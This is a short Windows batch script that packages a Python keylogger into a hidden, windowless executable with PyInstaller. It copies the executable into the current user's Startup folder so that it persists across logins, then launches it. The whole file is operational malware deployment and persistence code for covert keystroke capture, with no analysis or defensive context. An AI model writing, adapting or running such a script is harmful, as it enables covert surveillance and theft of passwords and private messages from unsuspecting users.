@echo off
pyinstaller -F -w keylogger.py
SET username = %USERNAME%
SET path="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy ".\keylogger.exe" %path%
cd %path%
start "" keylogger.exe
exit
